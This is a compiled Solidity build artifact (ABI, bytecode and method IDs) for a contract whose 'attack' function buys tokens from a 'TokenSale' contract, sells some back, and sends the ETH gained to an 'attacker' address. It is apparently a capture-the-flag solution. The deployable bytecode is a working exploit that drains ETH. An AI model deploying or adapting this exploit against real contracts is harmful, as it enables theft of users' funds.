{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract TokenSale",
          "name": "_tokenSale",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "buyAmount",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "sellAmount",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "tokenSale",
      "outputs": [
        {
          "internalType": "contract TokenSale",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": {
    "object": "0x608060405234801561001057600080fd5b5060405161050b38038061050b83398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b61046f8061009c6000396000f3fe6080604052600436106100385760003560e01c806348eb76ee14610044578063b94203101461009a578063e1fa7638146100c757600080fd5b3661003f57005b600080fd5b34801561005057600080fd5b506001546100719073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b3480156100a657600080fd5b506000546100719073ffffffffffffffffffffffffffffffffffffffff1681565b6100da6100d536600461038c565b6100dc565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d348b4096040518163ffffffff1660e01b8152600401602060405180830381865afa15801561014a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061016e91906103ae565b9050600061017c84836103f6565b9050803410156101ec576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600e60248201527f4e6f7420656e6f75676820455448000000000000000000000000000000000000604482015260640160405180910390fd5b6000546040517f2d296bf10000000000000000000000000000000000000000000000000000000081526004810186905273ffffffffffffffffffffffffffffffffffffffff90911690632d296bf19034906024016000604051808303818588803b15801561025957600080fd5b505af115801561026d573d6000803e3d6000fd5b505050505060008467016345785d8a000061028891906103f6565b6102929084610413565b90508181116102a057600080fd5b6000546040517f47d8167d00000000000000000000000000000000000000000000000000000000815260048101869052623d0900602482015273ffffffffffffffffffffffffffffffffffffffff909116906347d8167d90604401600060405180830381600087803b15801561031557600080fd5b505af1158015610329573d6000803e3d6000fd5b505050506000344761033b9190610426565b60015460405191925073ffffffffffffffffffffffffffffffffffffffff169082156108fc029083906000818181858888f19350505050158015610383573d6000803e3d6000fd5b50505050505050565b6000806040838503121561039f57600080fd5b50508035926020909101359150565b6000602082840312156103c057600080fd5b5051919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b808202811582820484141761040d5761040d6103c7565b92915050565b8082018082111561040d5761040d6103c7565b8181038181111561040d5761040d6103c756fea2646970667358221220453ef96671ab6aff4ea44024bef22fdb598913adeb166e915ca353063bc96e8c64736f6c63430008140033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "attack(uint256,uint256)": "e1fa7638",
    "attacker()": "48eb76ee",
    "tokenSale()": "b9420310"
  },
  "id": 18
}